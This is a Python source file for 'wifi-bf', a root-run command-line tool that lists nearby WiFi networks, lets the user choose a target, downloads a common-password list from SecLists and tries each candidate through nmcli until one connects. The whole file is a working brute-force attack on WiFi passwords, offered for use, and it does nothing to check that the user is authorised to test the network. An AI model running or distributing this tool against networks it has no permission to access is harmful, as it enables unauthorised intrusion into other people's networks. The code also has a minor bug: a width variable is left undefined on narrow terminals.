import subprocess
from typing import Optional
import argparse
import subprocess
import os
import urllib.request
import sys
import time
import shlex
from typing import Generator
from tqdm import tqdm

DEFAULT_PASSWORD_LIST_URL = "https://raw.githubusercontent.com/danielmiessler/SecLists/refs/heads/master/Passwords/Common-Credentials/100k-most-used-passwords-NCSC.txt"

# service NetworkManager restart

def cls():
    os.system('cls' if os.name == 'nt' else 'clear')
    
def header():
    print('''
==============================================================
	██╗    ██╗██╗███████╗██╗      ██████╗ ███████╗
	██║    ██║██║██╔════╝██║      ██╔══██╗██╔════╝
	██║ █╗ ██║██║█████╗  ██║█████╗██████╔╝█████╗  
	██║███╗██║██║██╔══╝  ██║╚════╝██╔══██╗██╔══╝  
	╚███╔███╔╝██║██║     ██║      ██████╔╝██║     
	 ╚══╝╚══╝ ╚═╝╚═╝     ╚═╝      ╚═════╝ ╚═╝     
                                     
                 https://github.com/flancast90
                         By: BLUND3R                 
==============================================================
    
    ''')

class bcolors:
    HEADER = '\033[95m'
    OKBLUE = '\033[94m'
    OKCYAN = '\033[96m'
    OKGREEN = '\033[92m'
    WARNING = '\033[93m'
    FAIL = '\033[91m'
    ENDC = '\033[0m'
    BOLD = '\033[1m'
    UNDERLINE = '\033[4m'
    VERBOSEGRAY = '\033[170m'


"""
    This function cutlize the argparse which gives a description of the program and
    the list of arguments supported
"""


def argument_parser():
    parser = argparse.ArgumentParser(
        prog="wifi-bf",
        description="Brute force wifi password with python 3"
    )

    parser.add_argument(
        '-u', '--url',
        type=str,
        default=None,
        help='The url that contains the list of passwords'
    )
    parser.add_argument(
        '-f', '--file',
        type=str,
        default=None,
        help='The file that contains the list of passwords'
    )
    
    parser.add_argument(
    	'-v', '--verbose',
    	action='store_true',
    	help='Optional: Use to show all passwords attempted, rather than just the successful one.'
    )

    parser.add_argument(
        '-l', '--list-ssids',
        action='store_true',
        help='List all available SSIDs'
    )

    return parser.parse_args()


"""
	This functions returns a list of passwords from a url
"""


def fetch_password_from_url(url):
    try:
        return urllib.request.urlopen(url)
    except:
        return None


"""
	This functions saves a list of passwords to a file
"""


def save_passwords_locally(passwords):
    with open('passwords.txt', 'w') as file:
            for password in passwords:
                decoded_line = password.decode("utf-8")
                file.write(decoded_line)


"""
	This functions checks if a local password file is found
"""


def local_passwords_file_exists():
    return os.path.exists('passwords.txt')


"""
	This functions returns a local previously downloaded local passwords file
"""


def get_local_passwords():
    with open('passwords.txt', 'r') as file:        
        return file.readlines()


"""
	This functions checks whether the user is running the program as root. If the user is not a root,
	an error message is displayed and the program exit
"""


def require_root():
    r = os.popen("whoami").read()
    if (r.strip() != "root"):
        print("Run it as root.")
        sys.exit(-1)


"""
	This functions shows the user the list of targets
"""


def display_targets(ssid_list: list[tuple[str, str]]):
    print("Select a target: \n")
    
    _rows, columns = os.popen('stty size', 'r').read().split()
    if (int(columns) >= 100):
        col_shift = int(int(columns) * 0.75)
    
    for i, (ssid, security_type) in enumerate(ssid_list):
        spacer_width = int(columns) - len(f"{i + 1}. {ssid}") - 7 - col_shift
        spaces = f" {spacer_width * '.'} "

        print(f"{i + 1}. {ssid}{spaces}{security_type}")
        
"""
	This functions prompt the user to enter the target choice and returns the choice.
	The function runs in a loop until the user enter the correct target
"""


def prompt_for_target_choice(ssid_list: list[tuple[str, str]]) -> str:
    while True:
        try:
            selected = int(input("\nEnter number of target: "))
            if(selected >= 1 and selected <= len(ssid_list)):
                return ssid_list[selected - 1][0]
        except Exception:
            pass

        print(f"Invalid choice: Please pick a number between 1 and {len(ssid_list)}")


def normalized_passwords(passwords: list[str]) -> Generator[str, None, None]:
    for password in passwords:
        # necessary due to NetworkManager restart after unsuccessful attempt at login
        password = password.strip()

        # when when obtain password from url we need the decode utf-8 however we doesnt when reading from file
        yield password if isinstance(password, str) else password.decode("utf-8")


"""
	This function takes the targeted network and list of password and attempt to brute force it.
"""


def brute_force(ssid, passwords, args):
    # Convert passwords to list for tqdm to work properly
    password_list = list(normalized_passwords(passwords))
    
    for password in tqdm(password_list, desc=f"Brute-forcing {ssid}", unit="passwords"):
            
        if args.verbose is True:
            print(bcolors.HEADER+"** TESTING **: with password '" +
                password+"'"+bcolors.ENDC)

        if (len(password) >= 8):
            contain = False
            
            while contain == False:
                available = os.popen("nmcli -f SSID dev wifi").read()
                available = available.split('\n')
                available = [item.strip() for item in available]
            
                if ssid in available:
                    contain = True
                else:
                    time.sleep(1)
            
            command = shlex.split(f"sudo nmcli dev wifi connect {shlex.quote(ssid)} password {shlex.quote(password)}")
            try:
                output = subprocess.run(command, capture_output=True, text=True, 
                    check=True)
                if "error" in output.stdout.lower():
                    if args.verbose is True:
                        print(bcolors.FAIL+"** TESTING **: password '" +
                            password+"' failed."+bcolors.ENDC)
                        print(f"{bcolors.VERBOSEGRAY}{output.stdout}{bcolors.ENDC}")
                elif "successfull" in output.stdout.lower():
                    sys.exit(bcolors.OKGREEN+"** KEY FOUND! **: password '" +
                        password+"' succeeded."+bcolors.ENDC)
                else:
                    print(f"Unknown output: {output.stdout}")
            except subprocess.CalledProcessError:
                if args.verbose is True:
                    print(bcolors.FAIL+"** TESTING **: password '" +
                        password+"' failed."+bcolors.ENDC)

        else:
            if args.verbose is True:
                print(bcolors.OKCYAN+"** TESTING **: password '" +
                    password+"' too short, passing."+bcolors.ENDC)

    print(bcolors.FAIL+"** RESULTS **: All passwords failed :("+bcolors.ENDC)


def fetch_ssids() -> dict[str, str]:
	wifi_dict: dict[str, str] = {}

	result = subprocess.run(
        shlex.split("nmcli -f SSID,SECURITY dev wifi"),
        capture_output=True,
        text=True
    ).stdout
	for line in result.split("\n")[1:]:  # Skip header line
		line = line.strip()   
		if line and line != "--":
			# Find the last occurrence of whitespace to separate SSID from SECURITY
			# This handles SSIDs that contain spaces
			last_space_index = line.rfind('  ')
			if last_space_index != -1:
				network_name = line[:last_space_index].strip()
				security_type = line[last_space_index + 1:].strip()
				if network_name and network_name != "--" and security_type:
					if network_name not in wifi_dict:
						wifi_dict[network_name] = security_type
	return wifi_dict


def fetch_passwords(args):
    # The user chose to supplied their own url
    if args.url is not None:
        passwords = fetch_password_from_url(args.url)
    # user elect to read passwords form a file
    elif args.file is not None:
        with open(args.file, "r") as file:
            passwords = file.readlines()
    else:
        # fallback to the default list as the user didn't supply a password list
        passwords = fetch_password_from_url(DEFAULT_PASSWORD_LIST_URL)
        if passwords:
            save_passwords_locally(passwords=passwords)
            passwords = get_local_passwords()
        elif local_passwords_file_exists():
            passwords = get_local_passwords()
        else:
            sys.exit(bcolors.FAIL+"Fetch failed. Check internet status."+bcolors.ENDC)
    return passwords


def main():
    cls()
    header()
    require_root()
    args = argument_parser()

    ssids = fetch_ssids()
    if not ssids:
        print("No networks found!")
        sys.exit(-1)
    ssid_list = sorted(ssids.items(), key=lambda item: item[0].lower())
    display_targets(ssid_list)
    if args.list_ssids:
        sys.exit(0)

    passwords = fetch_passwords(args)
    if not passwords:
        print("Password file cannot be empty!")
        exit(0)

    ssid = prompt_for_target_choice(ssid_list)
    
    cls()
    header()
    print("\nWifi-bf is running. If you would like to see passwords being tested in realtime, enable the [--verbose] flag at start.")
    brute_force(ssid, passwords, args)


main()
